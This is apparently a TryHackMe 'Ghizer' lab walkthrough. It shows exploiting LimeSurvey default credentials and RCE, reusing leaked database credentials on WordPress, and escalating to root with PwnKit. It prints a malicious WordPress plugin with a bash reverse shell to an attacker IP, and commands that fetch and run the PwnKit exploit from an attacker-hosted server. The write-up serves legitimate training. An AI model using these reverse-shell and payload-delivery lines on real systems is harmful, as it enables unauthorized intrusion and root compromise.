# TryHackMe — Ghizer Walkthrough

## 1. Reconnaissance

Nmap scan revealed three open ports:

- **21 (FTP)** — anonymous login was allowed, but file transfers failed with connection errors. Not usable.
- **80 (HTTP)** — LimeSurvey instance.
- **443 (HTTPS)** — WordPress site.

## 2. Initial Access — LimeSurvey RCE

### 2.1 Default credentials

Browsing to `http://<TARGET_IP>/admin` showed a LimeSurvey login page. The default credentials **`admin:password`** worked. The dashboard displayed a warning about using the default password. The version was **3.15.9**.

### 2.2 Exploit

A searchsploit lookup found **`46634.py`** (LimeSurvey < 3.16, authenticated RCE via PHAR deserialization). Running the exploit:

    python2 46634.py http://<TARGET_IP> admin password

This returned a reverse shell as `www-data`.

### 2.3 Extracting database credentials

Searching for configuration files:

    find / -name "config.php" 2>/dev/null

Found `/var/www/html/limesurvey/application/config/config.php` containing MySQL credentials:

- **Username**: `Anny`
- **Password**: `P4$W0RD!!#S3CUr3!`
- **Database**: `limedb`

## 3. Lateral Movement — WordPress Shell

### 3.1 Logging into WordPress

The WordPress site on port 443 had a hidden login path (commonly `/?devtools`, or discoverable via the "Log in" link in the page footer). Logged in with `Anny` / `P4$W0RD!!#S3CUr3!`.

### 3.2 Uploading a malicious plugin

Created a minimal WordPress plugin (must include a `Plugin Name` header):

    <?php
    /*
    Plugin Name: Shell
    */
    exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'");
    ?>

Zipped it, uploaded via **Plugins → Add New → Upload Plugin**, and activated it. This returned a shell as `www-data`.

### 3.3 Failed privilege escalation attempt

    sudo -l

No passwordless sudo entries. Checked SUID binaries and found `/usr/bin/pkexec`.

## 4. Privilege Escalation — PwnKit (CVE-2021-4034)

### 4.1 Confirming the vulnerability

    pkaction --version
    # pkaction version 0.105

    ls -la /usr/bin/pkexec
    # -rwsr-xr-x 1 root root ... /usr/bin/pkexec

Version `0.105` without a distro patch suffix (e.g., `0.105-31ubuntu0.1` is patched) indicates a potentially vulnerable `pkexec`.

### 4.2 Delivering and running the exploit

Since `curl` was not installed on the target, the exploit was downloaded on the attacker machine (Kali) and served over HTTP:

    # On Kali
    wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
    python3 -m http.server 8080

    # On the target (via the www-data shell)
    cd /tmp
    wget http://<ATTACKER_IP>:8080/PwnKit
    chmod +x PwnKit
    ./PwnKit

The exploit succeeded and returned a **root shell**. Both flags were retrieved:

- `/root/root.txt`
- `/home/veronica/user.txt`
